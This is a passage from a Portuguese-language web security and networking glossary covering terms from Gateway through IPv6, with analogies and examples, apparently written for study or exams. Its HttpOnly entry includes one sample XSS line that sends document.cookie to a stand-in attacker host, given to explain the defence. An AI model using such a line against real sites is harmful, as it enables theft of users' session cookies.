  export HTTPS_PROXY="http://proxy-saida.corporativo.test:3128"
  ```

---

<a id="s8-g"></a>
### 8.7 Letra G

##### Gateway (Gateway Padrão / Default Gateway)
- **Nome**: Gateway Padrão (*Default Gateway* — Roteador de Saída Padrão).
- **Significado**: Nó de rede (tipicamente a interface LAN de um roteador ou switch Layer 3) configurado na tabela de roteamento de um host (associado à rota padrão `0.0.0.0/0` no IPv4 ou `::/0` no IPv6) para o qual o sistema operacional encaminha todos os pacotes IP cujo endereço de destino **não pertence** à sub-rede local (determinada pela operação lógica `AND` bit a bit com a máscara de sub-rede). Na entrega do pacote até o gateway dentro da rede local, o quadro Ethernet (Camada 2) usa o **MAC Address do Gateway** como destino, mas o pacote IP (Camada 3) mantém o **IP final do servidor remoto** inalterado.
- **Explicação simples**: É a portaria/guarita de saída do seu condomínio: para entregar uma carta ao vizinho da casa 12 do mesmo condomínio, você vai a pé direto até lá; mas para mandar uma carta para outra cidade, você a entrega na portaria do condomínio (Gateway Padrão), que sabe como colocá-la na rodovia principal.
- **Exemplo de utilização**: Visualizando a rota padrão (`default` / `0.0.0.0/0`) apontando para o gateway `192.168.1.1`:
  ```bash
  ip route
  # default via 192.168.1.1 dev eth0 proto dhcp metric 100
  # 192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.50
  ```

##### GET, POST, PUT, PATCH e DELETE (Métodos HTTP)
- **Nome**: Métodos de Requisição HTTP (*HTTP Request Methods* ou Verbos HTTP — RFC 9110 e RFC 5789).
- **Significado**: Verbos padronizados enviados na primeira linha da requisição HTTP (*Request Line*) que definem a semântica da operação desejada sobre o recurso alvo:
  - **`GET`**: recupera uma representação do recurso; é um método **Seguro** (*Safe*, não deve alterar estado no servidor) e **Idempotente**; nunca deve transportar senhas ou tokens na URL.
  - **`POST`**: submete um payload no corpo da requisição para processamento, criação de um novo recurso subordinado ou execução de uma ação; **não é seguro nem idempotente**.
  - **`PUT`**: substitui integralmente a representação do recurso no URI especificado pelo payload enviado; **não é seguro, mas é idempotente**.
  - **`PATCH`** (RFC 5789): aplica uma modificação parcial a um recurso existente; **não é seguro** e, pela especificação geral, **não é obrigatoriamente idempotente** (embora na prática muitas APIs o implementem de forma idempotente).
  - **`DELETE`**: remove o recurso identificado pela URI; **não é seguro, mas é idempotente** (repetir a exclusão resulta no mesmo estado final de recurso ausente).
- **Explicação simples**: São as ordens que você dá ao arquivo do escritório: `GET` é "tire uma foto/leia a ficha", `POST` é "crie uma ficha nova na gaveta", `PUT` é "troque a ficha inteira por esta nova", `PATCH` é "corrija só o campo telefone na ficha" e `DELETE` é "jogue a ficha no triturador".
- **Exemplo de utilização**: Comparação rápida de semântica em uma API REST:
  ```http
  GET /api/v1/usuarios/10 HTTP/1.1      # Lê dados do usuário 10 (Safe + Idempotente)
  PUT /api/v1/usuarios/10 HTTP/1.1      # Substitui todo o registro 10 (Idempotente)
  PATCH /api/v1/usuarios/10 HTTP/1.1    # Atualiza apenas {"cargo": "Senior"}
  DELETE /api/v1/usuarios/10 HTTP/1.1   # Remove o usuário 10 (Idempotente)
  ```

---

<a id="s8-h"></a>
### 8.8 Letra H

##### Handshake (Negociação de Conexão TCP / TLS)
- **Nome**: Handshake (Aperto de Mão / Negociação Inicial de Protocolo).
- **Significado**: Processo estruturado de troca de mensagens de controle realizado antes da transmissão efetiva dos dados da aplicação para sincronizar estados, parâmetros operacionais ou chaves criptográficas entre cliente e servidor. Na web, destacam-se dois handshakes sequenciais (ou integrados no QUIC/HTTP/3):
  1. **TCP Three-Way Handshake** (`SYN` $\rightarrow$ `SYN-ACK` $\rightarrow$ `ACK`, 1 RTT): sincroniza os números de sequência iniciais (`ISN`) e confirma a alcançabilidade bidirecional na Camada 4.
  2. **TLS Handshake** (`ClientHello` $\rightarrow$ `ServerHello` + Certificado + `Finished`, 1 RTT no TLS 1.3): negocia a versão do protocolo, a suíte de cifras AEAD, valida o certificado X.509 do servidor e estabelece as chaves simétricas efêmeras via `ECDHE`. No Chrome DevTools (aba [Network > Timing](./02a-devtools-network.md#s2-1)), essas etapas aparecem nas barras **Initial connection** (que soma TCP + SSL) e **SSL**.
- **Explicação simples**: Antes de dois diplomatas começarem a tratar de assuntos secretos por telefone, primeiro eles dizem "Alô, está me ouvindo? Sim, alto e claro" (Handshake TCP) e logo em seguida combinam em qual idioma codificado vão falar e conferem as credenciais um do outro (Handshake TLS).
- **Exemplo de utilização**: No painel **Timing** de uma requisição HTTPS na aba Network, observa-se `Initial connection: 42 ms` (dos quais `SSL: 24 ms` correspondem ao handshake TLS).

##### HAR (HTTP Archive Format)
- **Nome**: HAR (*HTTP Archive Format* — Formato de Arquivo de Tráfego HTTP, extensão `.har`).
- **Significado**: Formato padronizado estruturado em **JSON** utilizado por navegadores e ferramentas de análise (como a aba [Network](./02a-devtools-network.md#s2-1) do Chrome DevTools) para exportar o registro completo das requisições e respostas de uma sessão de navegação, incluindo URLs, métodos, cabeçalhos, payloads, tamanhos e métricas detalhadas de tempo (*Waterfall*). **Alerta crítico de segurança**: um arquivo HAR completo pode conter cookies de sessão ativos, headers `Authorization: Bearer ...`, chaves de API e senhas em texto claro enviadas em formulários; compartilhá-lo sem sanitização equivale a entregar a sessão autenticada a terceiros. Por isso, versões recentes do Chrome DevTools higienizam (*sanitize*) por padrão os headers `Cookie`, `Set-Cookie` e `Authorization` ao exportar HAR, oferecendo opção separada quando o desenvolvedor precisa exportar com dados sensíveis.
- **Explicação simples**: É a "caixa-preta" de voo da aba Network salva em um arquivo de texto JSON: qualquer engenheiro que importar esse arquivo no próprio DevTools verá exatamente a mesma tabela de requisições e respostas que aconteceu no seu computador.
- **Exemplo de utilização**: Na barra superior da aba **Network**, clique no ícone de download (**Export HAR (sanitized)...**) para salvar o log de rede sem vazar cookies de sessão em chamados de suporte.

##### Hash (Função Hash Criptográfica)
- **Nome**: Hash Criptográfico (*Cryptographic Hash Function* — Função de Resumo Criptográfico / *Message Digest*).
- **Significado**: Função matemática **unidirecional** (irreversível) e determinística que recebe uma entrada de tamanho arbitrário (uma senha, um texto ou um arquivo de vários gigabytes) e produz uma saída de tamanho fixo (o *digest* ou resumo, ex.: 256 bits / 64 caracteres hexadecimais no `SHA-256`). Uma função hash criptograficamente segura possui três propriedades fundamentais: **resistência à pré-imagem** (impossível descobrir a entrada original a partir do hash), **resistência à segunda pré-imagem** e **resistência a colisões** (inviável encontrar duas entradas diferentes que gerem o mesmo hash). Algoritmos antigos como **MD5** e **SHA-1** sofrem de colisões práticas conhecidas e são **[Obsoletos]** para segurança, utilizando-se hoje a família **SHA-2** (`SHA-256`, `SHA-384`, `SHA-512`) e **SHA-3** para integridade, e funções especializadas lentas com *salt* (**Argon2id**, **bcrypt**) para senhas.
- **Explicação simples**: É como fazer uma vitamina de frutas no liquidificador: sempre que você colocar exatamente as mesmas frutas, o sabor final (hash) será idêntico; mas é fisicamente impossível olhar para o copo de vitamina pronta e reconstruir as frutas inteiras de volta (irreversível).
- **Exemplo de utilização**: Geração de hash SHA-256 para validação de integridade de arquivo (**SRI**):
  ```bash
  openssl dgst -sha384 -binary app.js | openssl base64 -A
  ```

##### Header HTTP (Cabeçalho HTTP)
- **Nome**: Header HTTP (*HTTP Header Field* — Campo de Cabeçalho HTTP — RFC 9110).
- **Significado**: Pares de metadados estruturados como `Nome-Do-Campo: Valor` transmitidos nas mensagens de requisição e de resposta HTTP antes do corpo da mensagem (*body*). Seus nomes são **case-insensitive** (insensíveis a maiúsculas/minúsculas segundo a RFC 9110, sendo obrigatoriamente convertidos para minúsculas em HTTP/2 e HTTP/3). Controlam negociação de conteúdo (`Content-Type`, `Accept`), cache (`Cache-Control`, `ETag`), gerenciamento de estado (`Cookie`, `Set-Cookie`), autenticação (`Authorization`), roteamento (`Host`) e políticas de segurança do navegador (`Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options` — veja [Headers de Segurança](./05-headers-de-seguranca.md#s5)).
- **Explicação simples**: São as informações escritas do lado de fora do envelope da carta: dizem quem está mandando, qual é o idioma do texto lá dentro, se a carta é confidencial e como o destinatário deve guardá-la.
- **Exemplo de utilização**: Inspeção dos cabeçalhos de resposta de um servidor utilizando `curl -I`:
  ```bash
  curl -I https://loja-ficticia.test
  # HTTP/2 200
  # content-type: text/html; charset=utf-8
  # strict-transport-security: max-age=63072000; includeSubDomains; preload
  ```

##### HSTS (HTTP Strict Transport Security)
- **Nome**: HSTS (*HTTP Strict Transport Security* — Segurança de Transporte Estrita HTTP — RFC 6797).
- **Significado**: Header de segurança de resposta HTTP (`Strict-Transport-Security`) enviado exclusivamente sobre conexões HTTPS válidas que instrui o navegador a armazenar em cache que aquele domínio (e opcionalmente todos os seus subdomínios, via `includeSubDomains`) **jamais** deve ser acessado via HTTP em texto claro durante o período definido em `max-age=<segundos>`. Qualquer tentativa futura de acesso a `http://...` é convertida internamente pelo próprio navegador para `https://...` (com redirecionamento interno `307 Internal Redirect`) antes de enviar qualquer pacote à rede, além de impedir que o usuário ignore avisos de certificado inválido. A diretiva `preload` permite inscrever o domínio em uma lista embutida no código-fonte dos principais navegadores, protegendo até mesmo o primeiro acesso histórico (*Trust On First Use* — TOFU).
- **Explicação simples**: É uma regra gravada na memória do navegador que diz: "Mesmo que o usuário digite `http://` sem o `s` ou clique num link antigo em uma rede Wi-Fi de aeroporto controlada por um invasor, troque para `https://` dentro do próprio computador antes de mandar qualquer dado para a rua".
- **Exemplo de utilização**: Configuração recomendada de HSTS para produção consolidada (2 anos):
  ```http
  Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
  ```

##### HTML (HyperText Markup Language)
- **Nome**: HTML (*HyperText Markup Language* — Linguagem de Marcação de Hipertexto — WHATWG HTML Living Standard).
- **Significado**: Linguagem de marcação padrão utilizada para estruturar o conteúdo e o significado semântico das páginas web por meio de elementos delimitados por tags (`<header>`, `<main>`, `<form>`, `<script>`, `<iframe>`, `<a>`) e seus atributos. Do ponto de vista de segurança, o HTML oferece atributos nativos de proteção essenciais, como `sandbox` em `<iframe>`, `rel="noopener noreferrer"` em links externos, `integrity` (SRI) em `<script>`/`<link>` e `autocomplete="off"` ou `"new-password"`, enquanto a interpolação de dados de usuários sem codificação de entidades HTML (`&lt;`, `&gt;`, `&quot;`, `&#x27;`, `&amp;`) origina vulnerabilidades de **HTML Injection** e **Cross-Site Scripting (XSS)**.
- **Explicação simples**: É o esqueleto e a estrutura arquitetônica da página web: define onde fica cada título, parágrafo, formulário de login, imagem e link.
- **Exemplo de utilização**: Incorporação segura de um documento externo em um `<iframe>` restrito com atributo `sandbox`:
  ```html
  <iframe src="https://widget.parceiro.test/mapa.html"
          sandbox="allow-scripts"
          referrerpolicy="no-referrer"
          title="Mapa da Loja"></iframe>
  ```

##### HTTP (Hypertext Transfer Protocol)
- **Nome**: HTTP (*Hypertext Transfer Protocol* — Protocolo de Transferência de Hipertexto — RFC 9110 / RFC 9112).
- **Significado**: Protocolo de comunicação da camada de Aplicação baseado no modelo requisição-resposta (*request-response*) e de natureza **stateless** (sem estado nativo entre requisições independentes) que fundamenta a World Wide Web. Na versão **HTTP/1.1** (RFC 9112), opera em formato textual legível sobre conexões TCP (porta padrão **80** quando sem criptografia). Por transmitir métodos, URLs, cabeçalhos, cookies e corpos de mensagem em **texto claro** (*plaintext*) quando não encapsulado em TLS, o HTTP puro é vulnerável à interceptação passiva (*sniffing*) e à modificação ativa (*Man-in-the-Middle*), sendo **[REQUISITO]** o uso de HTTPS para qualquer aplicação que envolva autenticação, dados pessoais ou integridade de conteúdo.
- **Explicação simples**: É o idioma oficial em que o navegador e o servidor conversam para pedir e entregar páginas web; porém, na versão HTTP pura (sem o "S"), é como conversar por cartão-postal aberto: todos os carteiros no caminho conseguem ler e rabiscar a mensagem.
- **Exemplo de utilização**: Mensagem bruta de requisição HTTP/1.1 enviada pelo navegador:
  ```http
  GET /produtos?categoria=livros HTTP/1.1
  Host: loja-ficticia.test
  User-Agent: Mozilla/5.0
  Accept: text/html
  ```

##### HTTP/2
- **Nome**: HTTP/2 (Segunda versão principal do protocolo HTTP — RFC 9113, identificado no DevTools como `h2`).
- **Significado**: Evolução do protocolo HTTP que preserva integralmente a semântica do HTTP (mesmos métodos, códigos de status, URIs e cabeçalhos), mas substitui a formatação textual da linha por uma **camada de enquadramento binário** (*binary framing layer*) sobre uma única conexão TCP + TLS. Introduz **multiplexação completa de fluxos** (*streams* — permitindo dezenas de requisições e respostas em paralelo na mesma conexão TCP sem o bloqueio de fila *Head-of-Line Blocking* da camada HTTP/1.1), **compressão de cabeçalhos via HPACK** (RFC 7541) e pseudo-cabeçalhos iniciados por dois-pontos (`:method`, `:scheme`, `:authority`, `:path`, `:status`). Apesar de resolver o bloqueio na camada HTTP, ainda sofre de *Head-of-Line Blocking* na camada **TCP** caso um pacote IP seja perdido na rede.
- **Explicação simples**: Se o HTTP/1.1 precisava abrir 6 guichês separados porque cada fila só atendia uma pessoa por vez, o HTTP/2 é uma rodovia expressa de múltiplas faixas onde dezenas de pacotes pequenos de arquivos diferentes viajam misturados ao mesmo tempo pela mesma conexão.
- **Exemplo de utilização**: Na aba [Network](./02a-devtools-network.md#s2-1) do Chrome DevTools, habilite a coluna **Protocol** para observar o valor `h2` e os pseudo-headers `:authority` e `:path` na visualização de cabeçalhos brutos.

##### HTTP/3
- **Nome**: HTTP/3 (Terceira versão principal do protocolo HTTP — RFC 9114, identificado no DevTools como `h3`).
- **Significado**: Versão mais recente do protocolo HTTP que substitui o protocolo de transporte **TCP** pelo protocolo **QUIC** (RFC 9000) operando sobre **UDP** (tipicamente na porta **443 UDP**). No HTTP/3, a criptografia **TLS 1.3** já está embutida nativamente dentro do próprio transporte QUIC (permitindo handshakes de **1-RTT** ou **0-RTT** combinando transporte e segurança em uma única etapa), os cabeçalhos são comprimidos com **QPACK** (RFC 9204) e os fluxos (*streams*) são independentes na camada de transporte, **eliminando definitivamente o Head-of-Line Blocking do TCP**: a perda de um datagrama UDP afeta exclusivamente o arquivo daquele *stream* específico, sem travar os demais recursos da página.
- **Explicação simples**: O HTTP/3 troca os trilhos rígidos do trem (TCP, onde um vagão atrasado para a composição inteira) por drones independentes voando sobre UDP com criptografia embutida (QUIC): a conexão fecha muito mais rápido e um pacote atrasado não trava o resto da página.
- **Exemplo de utilização**: Cabeçalho `Alt-Svc` (*Alternative Service*) enviado pelo servidor em uma resposta `h2` avisando ao navegador que ele suporta upgrade transparente para HTTP/3 na porta 443 UDP:
  ```http
  Alt-Svc: h3=":443"; ma=86400
  ```

##### HttpOnly (Atributo de Cookie)
- **Nome**: `HttpOnly` (Atributo de Segurança do Cabeçalho `Set-Cookie` — RFC 6265).
- **Significado**: Flag booleana incluída pelo servidor na diretiva `Set-Cookie` que instrui o navegador a **proibir o acesso ao cookie por meio de APIs JavaScript do cliente** (especificamente `document.cookie`, tanto para leitura quanto para sobrescrita). O cookie continua sendo armazenado normalmente pelo navegador e enviado automaticamente nos cabeçalhos HTTP das requisições de rede destinadas ao servidor. Seu uso é **[REQUISITO]** para cookies que armazenam identificadores de sessão (`session_id`) ou tokens de autenticação, pois impede que um ataque de **Cross-Site Scripting (XSS)** exfiltre o valor do cookie diretamente via `fetch('https://atacante.test/?c=' + document.cookie)` (veja [Application > Cookies](./02b-devtools-application.md#s2-2)).
- **Explicação simples**: É um passe magnético selado que só a catraca eletrônica do prédio (a rede HTTP) consegue ler: você o carrega no bolso e passa pela catraca normalmente, mas nenhum script curioso rodando dentro da página (`document.cookie`) consegue enxergar o número gravado nele.
- **Exemplo de utilização**: Na aba **Application > Storage > Cookies**, um cookie de sessão seguro deve apresentar um ícone de confirmação (`✓`) na coluna **HttpOnly**.

##### HTTPS (HTTP over TLS)
- **Nome**: HTTPS (*Hypertext Transfer Protocol Secure* / HTTP sobre TLS — RFC 9110 / RFC 2818, porta padrão **443 TCP/UDP**).
- **Significado**: Combinação do protocolo de aplicação HTTP sobre uma camada criptográfica de transporte **TLS** (*Transport Layer Security*, historicamente chamado de SSL). Garante o tripé de segurança em trânsito:
  1. **Confidencialidade**: cifra toda a requisição e resposta HTTP (caminho da URL, query string, cabeçalhos, cookies e corpo), restando visíveis para observadores de rede apenas o endereço IP, a porta e o nome do domínio no campo **SNI** (a menos que ECH — *Encrypted Client Hello* — esteja ativo).
  2. **Integridade**: detecta qualquer alteração, injeção ou truncamento de bytes no caminho por meio de códigos de autenticação AEAD.
  3. **Autenticidade**: comprova criptograficamente que o servidor é o verdadeiro detentor do domínio por meio de seu certificado digital **X.509** assinado por uma Autoridade Certificadora (**CA**) confiável.
- **Explicação simples**: É transformar o cartão-postal aberto do HTTP em um carro-forte blindado com escolta e identificação oficial: ninguém na rua vê o que está dentro, ninguém consegue trocar a carga no semáforo e você tem certeza de que o carro pertence realmente ao banco verdadeiro.
- **Exemplo de utilização**: Redirecionamento permanente (`301`) de todo o tráfego HTTP (porta 80) para HTTPS (porta 443) no Nginx:
  ```nginx
  server {
      listen 80;
      server_name loja-ficticia.test;
      return 301 https://$host$request_uri;
  }
  ```


---

<a id="s8-i"></a>
### 8.9 Letra I

##### ICMP (Internet Control Message Protocol)
- **Nome**: ICMP (*Internet Control Message Protocol* — Protocolo de Mensagens de Controle da Internet — RFC 792 para ICMPv4 e RFC 4443 para ICMPv6).
- **Significado**: Protocolo de suporte e diagnóstico da **Camada de Rede (Camada 3)** encapsulado diretamente dentro de pacotes IP (sem utilizar portas TCP ou UDP) responsável por relatar condições de erro de entrega e realizar diagnósticos de conectividade. Suas mensagens mais conhecidas são **Echo Request** (Tipo 8) e **Echo Reply** (Tipo 0), utilizadas pela ferramenta `ping`, **Destination Unreachable** (Tipo 3, incluindo o código *Fragmentation Needed* essencial para o **PMTUD** — *Path MTU Discovery*) e **Time Exceeded** (Tipo 11, emitido quando o campo **TTL** chega a zero, base do funcionamento do `traceroute`). Bloquear cegamente todo tráfego ICMP (especialmente no IPv6, onde o ICMPv6 também realiza descoberta de vizinhos NDP e autoconfiguração SLAAC) pode quebrar conexões legítimas (veja [Redes de Computadores](./04-redes-de-computadores.md#s4)).
- **Explicação simples**: É o serviço de avisos operacionais dos Correios: ele não transporta encomendas comerciais de clientes (não usa portas de aplicação), mas manda os avisos de "Destinatário ausente", "Prazo de viagem esgotado (TTL=0)" ou o teste de "Alô, esta agência está funcionando? (`ping`)".
- **Exemplo de utilização**: Teste de conectividade e latência (RTT) via ICMP Echo Request/Reply:
  ```bash
  ping -c 4 192.0.2.1
  ```

##### Idempotência (Idempotency em HTTP)
- **Nome**: Idempotência (*Idempotency* — Propriedade de Métodos HTTP — RFC 9110, Seção 9.2.2).
- **Significado**: Propriedade matemática e arquitetural segundo a qual o efeito colateral no estado do servidor resultante de **múltiplas requisições idênticas** (N > 1) é exatamente o mesmo que o efeito de **uma única requisição**. Na especificação HTTP (RFC 9110), os métodos **`GET`**, **`HEAD`**, **`OPTIONS`**, **`TRACE`**, **`PUT`** e **`DELETE`** são definidos como **idempotentes**, enquanto **`POST`** **não é idempotente** (enviar duas vezes um `POST /pagamentos` sem chave de idempotência pode gerar cobrança duplicada). **Pegadinha clássica de prova**: idempotência refere-se ao *estado no servidor*, não necesariamente ao código de status retornado (ex.: o primeiro `DELETE /item/5` pode retornar `200 OK` ou `204 No Content`, e o segundo `DELETE /item/5` pode retornar `404 Not Found`, mas o método continua sendo idempotente porque o estado final no servidor — item 5 excluído — permanece inalterado).
- **Explicação simples**: Apertar o botão de chamar o elevador para o térreo é **idempotente**: apertar uma vez ou apertar 15 vezes seguidas produz exatamente o mesmo resultado (o elevador vem uma vez para o térreo). Já pedir mais um café no caixa (`POST`) **não é idempotente**: se você pedir 3 vezes, vêm 3 cafés e 3 cobranças.
- **Exemplo de utilização**: Para tornar operações `POST` financeiras seguras contra falhas de rede e retentativas, APIs modernas implementam o cabeçalho `Idempotency-Key`:
  ```http
  POST /api/v1/transferencias HTTP/1.1
  Host: api.banco.test
  Idempotency-Key: 550e8400-e29b-41d4-a716-446655440000
  ```

##### IDOR / BOLA (Insecure Direct Object Reference / Broken Object Level Authorization)
- **Nome**: IDOR (*Insecure Direct Object Reference* — Referência Direta Insegura a Objetos — CWE-639) / BOLA (*Broken Object Level Authorization* — OWASP API Security Top 10 API1).
- **Significado**: Vulnerabilidade de controle de acesso horizontal que ocorre quando uma aplicação ou API expõe um identificador direto de um registro interno (como um ID sequencial de banco de dados `?id=1042`, número de pedido, CPF ou nome de arquivo) e confia apenas no fato de o usuário estar autenticado, **sem verificar no back-end se o objeto solicitado pertence de fato ao usuário daquela sessão**. Ao simplesmente incrementar ou alterar o identificador na URL, cabeçalho ou corpo JSON (`1042` $\rightarrow$ `1043`), um usuário autenticado consegue ler, modificar ou excluir dados privados de terceiros (veja [Vulnerabilidades Web](./03a-vulnerabilidades-parte1.md#s3)).
- **Explicação simples**: É um guarda-volumes de academia onde o atendente confere se você é aluno matriculado na entrada (autenticação), mas entrega a mochila de qualquer armário cujo número você pedir no balcão (`armário 42`, `armário 43`) sem conferir se aquela ficha é a sua.
- **Exemplo de utilização**: Na aba [Network](./02a-devtools-network.md#s2-1), se a requisição `GET /api/v1/faturas/5001` da conta A retorna `200 OK` e, ao testar `GET /api/v1/faturas/5002` (pertencente à conta B) em laboratório autorizado, o servidor também retorna `200 OK` com os dados da conta B em vez de `403 Forbidden` ou `404 Not Found`, há vulnerabilidade de IDOR/BOLA.

##### Iframe (`<iframe>` — Inline Frame)
- **Nome**: `<iframe>` (*Inline Frame* — Quadro em Linha HTML).
- **Significado**: Elemento HTML que incorpora um contexto de navegação aninhado (*nested browsing context*) completo — com seu próprio documento HTML, árvore DOM e contexto de execução JavaScript (`window`) — dentro da página principal. Quando o iframe carrega uma origem diferente, a **Same-Origin Policy (SOP)** impede que a página pai acesse o DOM do iframe (e vice-versa), devendo qualquer comunicação legítima ocorrer via `window.postMessage()` com validação estrita de `event.origin`. Do ponto de vista ofensivo e defensivo, iframes são vetores de **Clickjacking** (quando o site alvo é colocado dentro de um iframe malicioso — mitigado por `CSP: frame-ancestors` e `X-Frame-Options`) e de execução de scripts de terceiros (mitigado pelo atributo HTML `sandbox`).
- **Explicação simples**: É uma "janela dentro da janela": um quadro na parede da sua página web que exibe outra página inteira funcionando de forma independente lá dentro.
- **Exemplo de utilização**: No Chrome DevTools, a aba [Console](./02c-devtools-console.md#s2-3) possui o seletor de contexto (**Execution context selector**, que por padrão exibe `top`) permitindo alternar entre a página principal e cada `<iframe>` carregado.

##### IMAP (Internet Message Access Protocol)
- **Nome**: IMAP (*Internet Message Access Protocol* — Protocolo de Acesso a Mensagens da Internet — RFC 9051, portas **143 TCP** e **993 TCP para IMAPS**).
- **Significado**: Protocolo da camada de Aplicação utilizado por clientes de e-mail para **ler, pesquisar e organizar mensagens diretamente no servidor de correio**, mantendo o estado das pastas, marcadores e mensagens lidas/não lidas sincronizado entre múltiplos dispositivos (computador, celular, webmail). Contrasta com o **POP3** (que tradicionalmente baixa os e-mails para um único dispositivo e os remove do servidor) e com o **SMTP** (usado para o envio/transporte de e-mails). A porta **143** sem `STARTTLS` trafega credenciais em texto claro, sendo **[REQUISITO]** o uso de **IMAPS na porta 993 TCP** (TLS implícito).
- **Explicação simples**: Enquanto o SMTP é o carteiro que leva suas cartas para fora e o POP3 esvazia a caixa postal trazendo tudo para a gaveta de casa, o IMAP mantém suas cartas organizadas em pastas lá na nuvem do correio para que você veja a mesma caixa de entrada no celular e no notebook.
- **Exemplo de utilização**: Configuração segura de cliente de e-mail corporativo apontando para `imap.exemplo.test` na porta `993` com TLS 1.3 obrigatório.

##### IndexedDB (Indexed Database API)
- **Nome**: IndexedDB (*Indexed Database API* — Banco de Dados Indexado do Navegador — W3C Specification).
- **Significado**: Banco de dados NoSQL transacional, **assíncrono** e orientado a objetos embutido no navegador e isolado por origem (*Same-Origin Policy*). Diferentemente do `localStorage` (que é síncrono, bloqueia a thread principal e aceita apenas strings pequenas de ~5 MB), o IndexedDB armazena grandes volumes de dados estruturados (objetos JavaScript complexos, `Blob`, `File`, `ArrayBuffer` via algoritmo de clonagem estruturada), organiza registros em **Object Stores**, permite buscas rápidas por **Indexes**, suporta transações atômicas (`readonly`, `readwrite`, `versionchange`) e **pode ser acessado diretamente por Web Workers e Service Workers**. **Importante para segurança**: assim como o `localStorage`, o IndexedDB é totalmente acessível via JavaScript da mesma origem; logo, **não protege tokens de sessão ou segredos contra ataques de XSS** (veja a seção [Application](./02b-devtools-application.md#s2-2)).
- **Explicação simples**: Se o `localStorage` é um bloquinho de post-its colado na mesa que só aceita texto curto, o `IndexedDB` é um armário de arquivos completo com pastas indexadas, gavetas para arquivos pesados (fotos/vídeos offline) e controle de transações dentro do navegador.
- **Exemplo de utilização**: Na aba **Application > Storage > IndexedDB**, é possível expandir cada banco de dados da origem, visualizar suas *Object Stores*, seus *Indexes* e inspecionar ou excluir registros individualmente.

##### Initiator (Iniciador da Requisição no Chrome DevTools)
- **Nome**: Initiator (Coluna e Aba Iniciador da Requisição na aba Network do Chrome DevTools).
- **Significado**: Metadado exibido tanto na coluna **Initiator** da tabela de requisições quanto na sub-aba **Initiator** dos detalhes de uma requisição na aba [Network](./02a-devtools-network.md#s2-1) do DevTools, que revela exatamente **o que causou o disparo daquela requisição de rede**. Pode indicar `Parser` (o navegador encontrou uma tag `<img src>`, `<script src>` ou `<link>` ao ler o HTML na linha indicada), `Redirect` (um redirecionamento HTTP `301`/`302`/`307` anterior), `Script` (uma função JavaScript como `fetch()` ou manipulação do DOM, exibindo a **pilha de chamadas completa / Request call stack** com arquivo e linha clicáveis) ou `Other` (navegação digitada pelo usuário ou Service Worker).
- **Explicação simples**: É o "dedo-duro" do DevTools: quando você vê uma requisição suspeita saindo para um domínio desconhecido e se pergunta "Quem mandou o navegador baixar isso?!", a coluna e a aba *Initiator* apontam exatamente o arquivo e a linha de código responsável.
- **Exemplo de utilização**: Durante uma auditoria de segurança, ao clicar na sub-aba **Initiator** de uma requisição suspeita para `https://coletor-externo.test/log`, a seção **Request call stack** revela `enviarTelemetria @ tracker.js:84`, permitindo ir diretamente à linha 84 na aba *Sources*.

##### IP (Internet Protocol)
- **Nome**: IP (*Internet Protocol* — Protocolo de Internet).
- **Significado**: Principal protocolo de comunicação da **Camada de Rede (Camada 3 do modelo OSI / Camada de Internet do modelo TCP/IP)** responsável pelo **endereçamento lógico** de hosts e pelo **roteamento de pacotes** (datagramas IP) entre redes distintas através de múltiplos roteadores (*hops*). É um protocolo **não orientado a conexão** (*connectionless*) e de **melhor esforço** (*best-effort* / não confiável): ele não garante entrega, não garante ordem de chegada nem retransmite pacotes perdidos — essas garantias ficam a cargo da camada superior (**TCP** ou **QUIC**).
- **Explicação simples**: É o sistema de CEP, endereço residencial e triagem de caminhões dos Correios: coloca o remetente e o destinatário na caixa e escolhe as rodovias de cidade em cidade até o destino, deixando a conferência do conteúdo para quem recebe.
- **Exemplo de utilização**: Cabeçalho IP contendo endereço de origem (`Src`), endereço de destino (`Dst`) e tempo de vida (`TTL`) inspecionado em captura de pacotes.

##### IPv4 (Internet Protocol version 4)
- **Nome**: IPv4 (*Internet Protocol version 4* — Protocolo de Internet versão 4 — RFC 791).
- **Significado**: Quarta versão do protocolo IP, que utiliza endereços de **32 bits** ($2^{32} \approx 4,29$ bilhões de endereços), representados em notação decimal pontuada dividida em **4 octetos** de 8 bits (cada um variando de `0` a `255`, ex.: `192.0.2.10`). Devido ao esgotamento global de endereços públicos IPv4, depende fortemente da divisão entre faixas **privadas** (RFC 1918: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) e endereços públicos por meio de tradução **NAT** (*Network Address Translation*), além de utilizar mensagens de **Broadcast** e resolução **ARP**.
- **Explicação simples**: É o sistema antigo de números de telefone de 8 dígitos (32 bits divididos em 4 bloquinhos de 0 a 255): como a população da Internet cresceu demais, faltaram números individuais, obrigando casas e empresas a usarem ramais internos privados (NAT) atrás de um único número externo.
- **Exemplo de utilização**: Endereço IPv4 de loopback (`127.0.0.1`), endereço privado doméstico (`192.168.1.100`) e endereço público de documentação (`203.0.113.5`).

##### IPv6 (Internet Protocol version 6)
- **Nome**: IPv6 (*Internet Protocol version 6* — Protocolo de Internet versão 6 — RFC 8200).
- **Significado**: Sucessor do IPv4 projetado para resolver definitivamente a exaustão de endereços, utilizando endereços de **128 bits** ($2^{128} \approx 3,4 \times 10^{38}$ endereços), representados em **8 grupos de 4 dígitos hexadecimais** separados por dois-pontos (`:`), ex.: `2001:0db8:85a3:0000:0000:8a2e:0370:7334`. Permite duas regras de abreviação oficiais (RFC 5952): **omitir zeros à esquerda** em cada bloco (`0db8` $\rightarrow$ `db8`) e substituir **uma única vez** por endereço uma sequência contígua de blocos de zeros por `::` (`2001:db8:85a3::8a2e:370:7334`). Possui cabeçalho fixo simplificado de 40 bytes, **elimina o Broadcast** (substituído por *Multicast* e *Anycast*), substitui o ARP pelo **NDP** (ICMPv6) e dispensa o uso de NAT para conectividade fim a fim.
- **Explicação simples**: É um novo sistema de endereçamento com 128 bits (escrito em hexadecimal com dois-pontos) tão gigantesco que permite dar um endereço público exclusivo para cada grão de areia da Terra, sem precisar de gambiarra de ramal (NAT).
- **Exemplo de utilização**: Endereço IPv6 de loopback abreviado (`::1`, equivalente ao `127.0.0.1`), endereço link-local (`fe80::1`) e acesso via URL entre colchetes `https://[2001:db8::1]:8443/`.

---

<a id="s8-j"></a>
### 8.10 Letra J

##### JSON (JavaScript Object Notation)
- **Nome**: JSON (*JavaScript Object Notation* — Notação de Objetos JavaScript — RFC 8259).
